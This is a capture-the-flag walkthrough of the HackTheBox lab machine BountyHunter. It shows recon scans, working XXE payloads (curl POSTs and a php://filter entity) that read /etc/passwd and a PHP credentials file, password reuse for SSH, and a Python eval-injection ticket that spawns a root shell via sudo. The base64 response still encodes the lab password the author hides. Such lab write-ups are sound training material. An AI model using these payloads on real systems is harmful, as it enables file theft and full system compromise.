---
title: "Walk-through of BountyHunter from HackTHeBox"
header:
  teaser: /assets/images/2021-09-26-21-48-36.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - XXE
  - Burp
---

## Machine Information

![bountyhuter](/assets/images/2021-09-26-21-48-36.png)

BountyHunter is rated as an easy machine on HackTheBox. Although it's clear not all easy machines are created equal! We scan the box to find just two open ports, 22 and 80. A look at the website running on port 80 finds a Bug Bounty reporting system that is in development. We find our inputs on a test form are encoded and passed to a backend script, but on closer inspection we see it is vulnerable to XXE exploitation. More enumeration is needed to find a hidden file that contains credentials. This gives us SSH access, from there we find a python script that we can run as root. We just have to figure out what it's doing and write an input file that gives us a root shell.

<!--more-->

Skills required are web and OS enumeration. Skills learned are XXE exploits and understanding Python scripts to develop an exploit.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - BountyHunter](https://www.hackthebox.eu/home/machines/profile/359) |
| Machine Release Date | 24th July 2021 |
| Date I Completed It | 2nd October 2021 |
| Distribution Used | Kali 2021.2 – [Release Info](https://www.kali.org/blog/kali-linux-2021-2-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/bountyhunter]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.100 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/bountyhunter]
└─# nmap -p$ports -sC -sV -oA bh 10.10.11.100
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 21:51 BST
Nmap scan report for 10.10.11.100
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Not a lot a first glance, let's look at port 80:

![bountyhunter](/assets/images/2021-09-26-21-59-56.png)

We find a simple static webpage, the only link that works is Portal which takes us here:

![bountyhunter-portal](/assets/images/2021-09-26-22-01-03.png)

Clicking on the link on that page takes us here:

![bountyhunter-report](/assets/images/2021-09-26-22-02-15.png)

I fill in the form and hit submit, the result is output to the same page:

![bountyhunter-output](/assets/images/2021-09-26-22-20-34.png)

It also says **"If DB were ready, would have added:"**. Probably a clue of some sort.

## Website Enumeration

Looking at the source of the page we see a folder called resources:

```html
<html>
<head>
    <script src="/resources/jquery.min.js"></script>
    <script src="/resources/bountylog.js"></script>
</head>
<SNIP>
</html>
```

Looking at the resources folder there's a number of files in there:

![bountyhunter-resources](/assets/images/2021-09-27-21-19-41.png)

The readme file contains a todo list:

```text
┌──(root💀kali)-[~/htb/bountyhunter]
└─# curl http://bountyhunter.htb/resources/README.txt
Tasks:
[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
```

Another mention of a database, suggests maybe we are looking for credentials to connect.

Also the file bountylog.js sounds interesting, let's look at that:

```js
function returnSecret(data) {
    return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
    try {
        var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
        <bugreport>
        <title>${$('#exploitTitle').val()}</title>
        <cwe>${$('#cwe').val()}</cwe>
        <cvss>${$('#cvss').val()}</cvss>
        <reward>${$('#reward').val()}</reward>
        </bugreport>`
        let data = await returnSecret(btoa(xml));
        $("#return").html(data)
    }
    catch(error) {
        console.log('Error:', error);
    }
}
```

We see two interesting things. The first function is doing a POST to a php file called **tracker_diRbPr00f314.php**. The second function is declaring an XML entity, which makes us think about XML eXternal Entity (XXE) vulnerabilities.

## Feroxbuster

Calling a file dirbproof immediately makes me want to run a scan! Let's fire up feroxbuster with one of their suggested default scans. This one looks for files with common extensions, including php which may find something hidden:

```text
┌──(root💀kali)-[~/htb/bountyhunter]
└─# feroxbuster -u http://10.10.11.100 -x pdf -x js,html -x php txt json,docx

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.100
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [pdf, js, html, php, txt, json, docx]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      313c http://10.10.11.100/assets
200        0l        0w        0c http://10.10.11.100/db.php
301        9l       28w      316c http://10.10.11.100/resources
301        9l       28w      310c http://10.10.11.100/css
301        9l       28w      309c http://10.10.11.100/js
200      388l     1470w        0c http://10.10.11.100/index.php
200        5l       15w      125c http://10.10.11.100/portal.php
301        9l       28w      317c http://10.10.11.100/assets/img
200       69l      210w     2424c http://10.10.11.100/js/scripts.js
200        5l   108280w  1194961c http://10.10.11.100/resources/all.js
301        9l       28w      327c http://10.10.11.100/assets/img/portfolio
200        6l       34w      210c http://10.10.11.100/resources/README.txt
403        9l       28w      277c http://10.10.11.100/server-status
[####################] - 6m   1679944/1679944 0s      found:13      errors:64     
[####################] - 6m    239992/239992  656/s   http://10.10.11.100
[####################] - 6m    239992/239992  658/s   http://10.10.11.100/assets
[####################] - 6m    239992/239992  659/s   http://10.10.11.100/resources
[####################] - 6m    239992/239992  657/s   http://10.10.11.100/css
[####################] - 6m    239992/239992  658/s   http://10.10.11.100/js
[####################] - 6m    239992/239992  662/s   http://10.10.11.100/assets/img
[####################] - 5m    239992/239992  672/s   http://10.10.11.100/assets/img/portfolio
```

As expected we find a few interesting things, especially the file called dp.php. I'll come back to this later, for now I want to look at possible XXE more first.

## Exploiting XXE

Here's a bit of background on exploiting XXE if needed. First it's in the OWASP top ten mentioned [here](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) and described by them as:

```text
This attack occurs when untrusted XML input containing a reference to an external entity is processed by a weakly configured XML parser.
```

More information on Wikipedia [here](https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/), and [this](https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/) article is a good explanation of how XXE works with examples.

Finally HackTheBox has a number of other boxes that tackle XXE like [ForwardSlash](https://www.hackthebox.com/home/machines/profile/239), [Patents](https://www.hackthebox.com/home/machines/profile/224), [RE](https://www.hackthebox.com/home/machines/profile/198), [DevOops](https://www.hackthebox.com/home/machines/profile/140) and [Aragog](https://www.hackthebox.com/home/machines/profile/126).

Now to the task at hand. Going back to the test I submitted on the Bounty Report System - Beta page earlier, let's send it again and capture in Burp then pass to Repeater:

![bountyhunter-burp-test](/assets/images/2021-09-27-21-35-04.png)

We see a long data string is passed to the tracker php file, then the response has the fields from the web page and our entries in it. So we can assume the data field is our entries encoded in some way. If you've read the Acunetix article linked above they mention a PHP protocol wrapper, which just means you can encode your XXE payload in this case it's base64.

However if you look closely at the data string you'll see it has a %3D at the end not a =, so we know it's base64 encoded first, and then URL encoded. We can reverse this to see it:

```text
┌──(root💀kali)-[~/htb/bountyhunter]
└─# python3 -c "import sys, urllib.parse as ul; print(ul.unquote_plus('PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT50ZXN0LXRpdGxlPC90aXRsZT4KCQk8Y3dlPnRlc3QtY3dlPC9jd2U%2BCgkJPGN2c3M%2BdGVzdC1jdnNzPC9jdnNzPgoJCTxyZXdhcmQ%2BdGVzdC1ib3VudHk8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D'))" | base64 -d

<?xml  version="1.0" encoding="ISO-8859-1"?>
                <bugreport>
                <title>test-title</title>
                <cwe>test-cwe</cwe>
                <cvss>test-cvss</cvss>
                <reward>test-bounty</reward>
                </bugreport>
```

Now we know how to create our own data string we can test for XXE. First let's create a simple test:

![bountyhunter-cyberchef-pencer](/assets/images/2021-09-26-22-43-23.png)

We've just created our own doctype with a new entity called example with a value of pencer. I've used [CyberChef](https://gchq.github.io/CyberChef/) to base64 and then URL encode. Now paste that in to Burp and send it:

![bountyhunter-burp-pencer](/assets/images/2021-09-27-21-58-14.png)

We can see the value of the entity I created has been placed in the field within the form. This proves we can execute commands via XXE, next we can grab the passwd file. Let's do it using cURL this time, like before create the payload in CyberChef, base64 and URL encode then use here:

```text
┌──(root💀kali)-[~/htb/bountyhunter]
└─# curl -X POST -d data="PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIHJlcGxhY2UgWzwhRU5USVRZIGZpbGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPiBdPgogICAgICAgICAgICAgICAgPGJ1Z3JlcG9ydD4KICAgICAgICAgICAgICAgIDx0aXRsZT50ZXN0LXRpdGxlPC90aXRsZT4KICAgICAgICAgICAgICAgIDxjd2U%2BdGVzdC1jd2U8L2N3ZT4KICAgICAgICAgICAgICAgIDxjdnNzPnRlc3QtY3ZzczwvY3Zzcz4KICAgICAgICAgICAgICAgIDxyZXdhcmQ%2BJmZpbGU7PC9yZXdhcmQ%2BCiAgICAgICAgICAgICAgICA8L2J1Z3JlcG9ydD4%3D" http://10.10.11.100/tracker_diRbPr00f314.php

If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>test-title</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td>test-cwe</td>
  </tr>
  <tr>
    <td>Score:</td>
    <td>test-cvss</td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<SNIP>
development:x:1000:1000:Development:/home/development:/bin/bash
<SNIP>
</td>
  </tr>
</table>
```

We have the list of accounts, and can see there is a user called development that can login. I did some more enumeration but didn't get anywhere, so looking back at that list of files I found with Ferroxbuster I tried a few, with db.php being the one I needed.

## Base64 Encoded Payload

It gets a little more complicated because we need to return the contents of that php file. We can use a built in function to base64 encode that file and return it to us. Using [this](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#php-wrapper-inside-xxe) example we create our payload the same way;

```html
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
                <bugreport>
                <title>test-title</title>
                <cwe>test-cwe</cwe>
                <cvss>test-cvss</cvss>
                <reward>&file;</reward>
                </bugreport>
```

As before base64 encode the payload, then URL encode it, then use curl to send to the tracker page:

```text
┌──(root💀kali)-[~/htb/bountyhunter]
└─# curl -X POST -d data="PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIHJlcGxhY2UgWzwhRU5USVRZIGZpbGUgU1lTVEVNICJwaHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS92YXIvd3d3L2h0bWwvZGIucGhwIj5dPgogICAgICAgICAgICAgICAgPGJ1Z3JlcG9ydD4KICAgICAgICAgICAgICAgIDx0aXRsZT50ZXN0LXRpdGxlPC90aXRsZT4KICAgICAgICAgICAgICAgIDxjd2U%2BdGVzdC1jd2U8L2N3ZT4KICAgICAgICAgICAgICAgIDxjdnNzPnRlc3QtY3ZzczwvY3Zzcz4KICAgICAgICAgICAgICAgIDxyZXdhcmQ%2BJmZpbGU7PC9yZXdhcmQ%2BCiAgICAgICAgICAgICAgICA8L2J1Z3JlcG9ydD4%3D" http://10.10.11.100/tracker_diRbPr00f314.php

If DB were ready, would have added:
<table>
<SNIP>
    <td>Reward:</td>
    <td>PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=</td>
  </tr>
</table>
```

## DB Credentials

We have a base64 encoded data string returned, now we can decode to see the contents of that db.php file:

```text
┌──(root💀kali)-[~/htb/bountyhunter]
└─# echo "PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=" | base64 -d
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "<HIDDEN>";
$testuser = "test";
?>
```

## User Flag

At last we have some credentials. It turns out this password was reused with the development account we found from the passwd file earlier:

```text
┌──(root💀kali)-[~/htb/bountyhunter]
└─# ssh development@bountyhunter.htb                
The authenticity of host 'bountyhunter.htb (10.10.11.100)' can't be established.
ECDSA key fingerprint is SHA256:3IaCMSdNq0Q9iu+vTawqvIf84OO0+RYNnsDxDBZI04Y.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'bountyhunter.htb,10.10.11.100' (ECDSA) to the list of known hosts.
development@bountyhunter.htb's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
Last login: Mon Sep 27 17:53:36 2021 from 10.10.14.27
development@bountyhunter:~$ 
```

We're in as the development user, let's grab the user flag:

```text
development@bountyhunter:~$ cat /home/development/user.txt 
<HIDDEN>
```

## Python Script

Looking in their home folder we see two more files:

```text
development@bountyhunter:~$ ls
contract.txt  user.txt  vulnerable.md


development@bountyhunter:~$ cat contract.txt 
Hey team,

I'll be out of the office this week but please make sure that
our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we
can't mess this up. Whenever one of you gets on please have a
look at the internal tool they sent over. There have been a
handful of tickets submitted that have been failing validation
and I need you to figure out why.

I set up the permissions for you to test this. Good luck.
-- John

development@bountyhunter:~$ cat vulnerable.md 
# Skytrain Inc
## Ticket to 
__Ticket Code:__
**32+__import__('os').system('/bin/bash')
```

The first one isn't important, the second is but it doesn't make any sense until we look at sudo rights:

```text
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

So we can run a python file called ticketValidator.py as root without a password. Safe to assume that's our escalation path. Let's check it out:

```python
development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py 
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

If you aren't familiar with Python this script may baffle you!

Looking back at the vulnerable.md file again we can see it is a template to the format needed:

```text
development@bountyhunter:~$ cat vulnerable.md 
# Skytrain Inc
## Ticket to 
__Ticket Code:__
**32+__import__('os').system('/bin/bash')
```

The script is checking the first three lines are as the example, then it splits the last line in to three parts. The two lines that you need to use to calculate the required sum are:

```text
if int(ticketCode) % 7 == 4:
```

This means the number in your ticket, which is provided in the template above as 32, has to be divisble by 7 and have 4 remainder. I used [this](https://www.calculators.org/math/modulo.php) site to calculate ny number.

```text
if validationNumber > 100:
```

This is a secondary check that just means the number you've picked above also needs to be greater than 100. Here's my final ticket:

```text
development@bountyhunter:~$ cat pencer.md 
# Skytrain Inc
## Ticket to root
__Ticket Code:__
**200+ 10 == 210 and __import__('os').system('/bin/bash') == True
```

## Root Flag

Now I can run the python script as root and point it at my ticket:

```text
development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
pencer.md
Destination: root

root@bountyhunter:/home/development# id
uid=0(root) gid=0(root) groups=0(root)

root@bountyhunter:/home/development# cat /root/root.txt
<HIDDEN>
```

All done. See you next time.
